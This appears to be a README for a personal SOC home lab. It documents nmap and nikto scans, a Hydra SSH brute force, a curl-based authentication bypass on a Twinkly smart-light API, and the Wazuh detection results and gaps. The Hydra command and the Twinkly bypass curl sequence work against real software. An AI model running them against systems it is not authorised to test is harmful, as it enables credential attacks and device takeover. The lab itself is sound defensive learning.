# Home SOC Lab
![Proxmox](https://img.shields.io/badge/Virtualization-Proxmox-blue)
![Wazuh](https://img.shields.io/badge/SIEM-Wazuh-green)
![Kali Linux](https://img.shields.io/badge/Attacker-Kali%20Linux-red)
![Ubuntu](https://img.shields.io/badge/Target-Ubuntu-orange)
![IoT](https://img.shields.io/badge/IoT-Twinkly-yellow)

---

## Lab Architecture

<p align="center">
  <img src="architecture/lab-network-diagram.png" width="400">
</p>

This repository documents the design, build, and investigation exercises from my personal cybersecurity home lab.
The goal of this lab is to simulate a small **Security Operations Center (SOC)** environment where attacks can be generated, detected, investigated, and documented using real security tools.

---

## Lab Objectives

* Build a virtual SOC environment using Proxmox
* Monitor endpoint activity using Wazuh SIEM
* Simulate attacks using Kali Linux
* Investigate alerts using SIEM dashboards
* Document findings through incident reports
* Explore IoT device security on real consumer hardware

---

## Current Lab Status

✔ Proxmox VE 9.1.1 hypervisor deployed  
✔ Ubuntu Server (target) deployed and configured  
✔ Kali Linux (attacker) deployed  
✔ Wazuh SIEM deployed (all-in-one)  
✔ Wazuh agent installed and connected to Ubuntu  
✔ SSH service exposed for testing  
✔ Network reconnaissance completed (Nmap)  
✔ Web enumeration completed (Gobuster, Nikto)  
✔ Brute force attack simulated using Hydra  
✔ Detection validated in Wazuh (3,000+ events)  
✔ MITRE ATT&CK mapping reviewed in dashboard  
✔ Incident report created and documented  
✔ IoT device API exploration (Twinkly lights)  
⬜ Apache log monitoring in Wazuh  
⬜ Network IDS (Suricata)  
⬜ Web attack simulation (DVWA)  
⬜ Windows endpoint monitoring  
⬜ Fail2Ban on Ubuntu  
⬜ Network segmentation / VLANs  

---

## Skills Demonstrated

* SIEM deployment and configuration (Wazuh)
* Endpoint monitoring and log analysis
* Network reconnaissance (Nmap)
* Web enumeration (Gobuster, Nikto)
* Brute force attack simulation (Hydra)
* SSH authentication log analysis
* MITRE ATT&CK mapping (T1046, T1110.001)
* Alert correlation and severity triage
* Detection gap analysis
* Threat detection and investigation workflows
* IoT device fingerprinting and API exploitation
* Proxmox virtualization
* Linux system administration
* Incident documentation and reporting

---

## Lab Environment

### Systems

> Note: IPs are DHCP-assigned and may change between sessions. Always run `nmap -sn 192.168.86.0/24` at the start of each session to confirm.

| VM | OS | IP (current) | Role |
|---|---|---|---|
| VM 101 | Kali Linux | 192.168.86.42 | Attacker |
| VM 100 | Ubuntu Server | 192.168.86.40 | Target |
| VM 102 | Wazuh | 192.168.86.44 | SIEM / Defender |

**Network:** 192.168.86.0/24  
**Hypervisor:** Proxmox VE 9.1.1 on Dell Optiplex 990

### Target Services Confirmed

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache httpd 2.4.58 |

### Network Devices of Interest

| Device | IP | Notes |
|---|---|---|
| Twinkly smart lights | 192.168.86.20 | ESP32/Espressif — IoT security target |

---

## Attack Simulations

### 1. Network Reconnaissance (Nmap)

Passive and active reconnaissance against the Ubuntu target to enumerate open ports, service versions, and OS information.

**Commands used:**
```bash
ping -c 4 192.168.86.40
nmap -sV 192.168.86.40
nmap -A 192.168.86.40
```

**Findings:**

| Port | State | Service | Version |
|---|---|---|---|
| 22/tcp | open | SSH | OpenSSH 9.6p1 |
| 80/tcp | open | HTTP | Apache httpd 2.4.58 |

**Notable observations:**
* Default Apache page still active — server not hardened
* SSH host keys (ECDSA + ED25519) enumerated
* OS fingerprinting returned false positive (MikroTik) — service banners are more reliable
* Network distance: 1 hop (same subnet)

**MITRE ATT&CK:** T1046 – Network Service Discovery  
**Wazuh detection:** ❌ Not detected (network layer not monitored by default)

---

### 2. Web Enumeration (Gobuster + Nikto)

Directory brute force and vulnerability scanning against the Apache web server.

**Commands used:**
```bash
gobuster dir -u http://192.168.86.40 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://192.168.86.40
```

**Gobuster findings:**

| Path | Status | Notes |
|---|---|---|
| `/index.html` | 200 | Default Apache page |
| `/server-status` | 403 | mod_status enabled — info leakage risk |
| `/.htaccess`, `/.htpasswd`, `/.hta` | 403 | Exist but blocked |

**Nikto findings:**
* Version disclosure — Apache version in every response header
* Missing X-Frame-Options — clickjacking protection absent
* Missing X-Content-Type-Options — MIME sniffing protection absent
* ETag inode leakage — CVE-2003-1418, 20+ year old unpatched misconfiguration
* OPTIONS method allowed — server reveals accepted HTTP verbs

**Wazuh detection:** ❌ Not detected (Apache logs not configured in agent)

---

### 3. SSH Brute Force (Hydra)

Credential attack against the Ubuntu SSH service using the rockyou.txt wordlist.

**Command used:**
```bash
hydra -l steve -P /usr/share/wordlists/rockyou.txt ssh://192.168.86.40
```

**Attack stats:**
* 248 tries/minute, 16 parallel tasks
* 14,344,399 passwords in wordlist

**Wazuh detection:** ✅ Detected immediately

| Metric | Value |
|---|---|
| Events generated | 3,000+ in ~2 minutes |
| Rule fired | 5760 – sshd authentication failed (level 5) |
| Correlation alert | Level 12 (High) – failures followed by success |
| MITRE tactic | Credential Access |
| MITRE technique | T1110.001 – Password Guessing |

---

### 4. IoT Device API Exploitation (Twinkly Lights)

Unauthenticated local API attack against a consumer IoT device on the same flat network as the lab.

**Target:** `twinkly-3710d5.lan` (192.168.86.20) — Twinkly smart lights, ESP32/Espressif, 400 RGB LEDs  
**Date:** 2026-05-03

#### Step 1 — Device discovery
```bash
nmap -sn 192.168.86.0/24
```
Twinkly appeared as `twinkly-3710d5.lan` with an Espressif MAC prefix — immediately identifiable as an ESP32 IoT device.

#### Step 2 — Port scan and fingerprinting
```bash
nmap -sV 192.168.86.20
```
Only port 80 open. Custom HTTP firmware (not Apache/nginx). Returns 404 on unknown paths, confirming the API is active.

#### Step 3 — Unauthenticated device enumeration
```bash
curl -s http://192.168.86.20/xled/v1/gestalt | python3 -m json.tool
```
Retrieved with **zero authentication:** device name ("Christmas tree"), MAC address, UUID, firmware family, LED count, RGB profile, and uptime (~27 days).

#### Step 4 — Authentication with fake challenge
```bash
curl -s -X POST http://192.168.86.20/xled/v1/login \
  -H "Content-Type: application/json" \
  -d '{"challenge":"AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8="}' \
  | python3 -m json.tool
```
Sent a completely fake base64 challenge string. Device returned a valid auth token valid for 4 hours — no real verification performed.

#### Step 5 — Token verification and device control
```bash
# Verify token
curl -s http://192.168.86.20/xled/v1/verify \
  -H "X-Auth-Token: <token>" | python3 -m json.tool

# Switch to color mode
curl -s -X POST http://192.168.86.20/xled/v1/led/mode \
  -H "X-Auth-Token: <token>" \
  -H "Content-Type: application/json" \
  -d '{"mode":"color"}'

# Set color (red/green/blue 0-255)
curl -s -X POST http://192.168.86.20/xled/v1/led/color \
  -H "X-Auth-Token: <token>" \
  -H "Content-Type: application/json" \
  -d '{"red":255,"green":0,"blue":0}'
```
Successfully changed light color remotely — full device control achieved via command line.

**Security findings:**

| Finding | Severity | Notes |
|---|---|---|
| Device info exposed without authentication | Medium | Name, MAC, UUID, firmware all public |
| Fake challenge accepted — weak mutual auth | High | No real credential validation |
| IoT device on flat network with VMs and admin machines | High | Any LAN device could do this |

**Key lesson:** This is the core argument for IoT VLAN segmentation. An attacker who gets onto your WiFi — or compromises any device on the network — can take full control of any IoT device without credentials.

**MITRE ATT&CK:** T1046 – Network Service Discovery, T1078 – Valid Accounts (token abuse)  
**Wazuh detection:** ❌ Not monitored (Wazuh not active this session; IoT device outside agent coverage)

---

## Detection Analysis

### What Wazuh Caught vs. Missed

| Attack | Tool | Detected | Reason |
|---|---|---|---|
| Port scan | nmap | ❌ | Network layer — not in OS logs |
| Web enumeration | gobuster | ❌ | Apache logs not configured |
| Web vuln scan | nikto | ❌ | Apache logs not configured |
| SSH brute force | hydra | ✅ | auth.log monitored by default |
| Auth failures + success | manual | ✅ | Correlation rule (level 12) |
| IoT API exploitation | curl | ❌ | IoT device not connected to SIEM |

**Key insight:** Wazuh out of the box monitors OS authentication well but is blind to network, web, and IoT layer attacks. Closing these gaps requires Apache log monitoring, a network IDS like Suricata, and IoT network segmentation.

### MITRE ATT&CK Coverage

Tactics observed in the Wazuh dashboard after exercises:
* Credential Access (dominant — Hydra brute force)
* Lateral Movement (SSH usage)
* Reconnaissance (partial detection)
* Defense Evasion (sudo activity)
* Privilege Escalation (sudo commands)

---

## SOC Investigation Reports

Incident reports are located in the **incident-reports** directory.

### Completed Reports

* SSH Brute Force Attack Detection  
  → `incident-reports/ssh-brute-force.md`

---

## Repository Structure

```
architecture/         Lab diagrams and network design
incident-reports/     SOC investigation reports
screenshots/          Evidence collected during investigations
```

---

## Lab Hardware

| Machine | Specs | Role |
|---|---|---|
| Dell Optiplex 990 | i5-2400, 16GB RAM, 2TB HDD | Primary Proxmox hypervisor |
| Smilodin | i5-3570K, needs RAM | Potential second Proxmox node |
| Optiplex 790 | i3-2120, 4GB RAM | Planned OPNsense firewall (low priority) |
| MacBook Pro Late 2013 | i7, 16GB | Admin / control machine |

---

## Lab Roadmap

### Completed
- [x] Proxmox hypervisor setup
- [x] VM deployment (Kali, Ubuntu, Wazuh)
- [x] Wazuh agent installation and configuration
- [x] Network reconnaissance (Nmap)
- [x] Web enumeration (Gobuster, Nikto)
- [x] SSH brute force simulation and detection (Hydra)
- [x] MITRE ATT&CK dashboard analysis
- [x] Detection gap analysis
- [x] IoT device fingerprinting and API exploitation (Twinkly)

### Planned
- [ ] Fail2Ban on Ubuntu (auto-ban brute force attempts)
- [ ] Wazuh active response (automated blocking)
- [ ] Apache log monitoring in Wazuh
- [ ] Network IDS with Suricata
- [ ] Web attack simulation (DVWA)
- [ ] Metasploit — structured exploitation framework
- [ ] Custom Wazuh detection rules
- [ ] Windows endpoint monitoring
- [ ] Network segmentation / VLANs (IoT isolation)
- [ ] OPNsense firewall on Optiplex 790
- [ ] OT/ICS security exploration (OpenPLC, Modbus)

---

## Summary

This lab demonstrates a complete SOC workflow:

* **Reconnaissance** — Nmap network and service scanning
* **Enumeration** — Gobuster directory brute force, Nikto vulnerability scanning
* **Attack simulation** — Hydra SSH brute force, IoT API exploitation
* **Detection** — Wazuh SIEM alert correlation
* **Analysis** — MITRE ATT&CK mapping, detection gap identification
* **Documentation** — Incident reporting and lab journaling

Designed to replicate real-world security monitoring and analysis in a controlled environment.
